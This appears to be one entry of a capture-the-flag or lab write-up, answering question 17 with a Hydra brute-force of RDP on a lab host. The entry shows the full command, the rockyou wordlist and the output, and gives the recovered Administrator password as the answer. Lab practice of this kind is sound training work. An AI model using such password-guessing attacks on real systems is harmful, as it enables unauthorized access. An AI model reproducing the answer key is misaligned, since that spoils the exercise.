## 17. What is the password of the "Administrator" user on WINSERVER-03?

Submit answer

Case-sensitive answer. Please enter text as displayed.

```bash
[3389][rdp] host: 192.168.100.55   login: administrator   password: swordfish


root@kali:~# hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.55
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-14 06:14:20
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking rdp://192.168.100.55:3389/
[STATUS] 1061.00 tries/min, 1061 tries in 00:01h, 14343338 to do in 225:19h, 4 active
[3389][rdp] host: 192.168.100.55   login: administrator   password: swordfish
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-14 06:16:02
root@kali:~# 
```

![[Pasted image 20251213205106.png]]
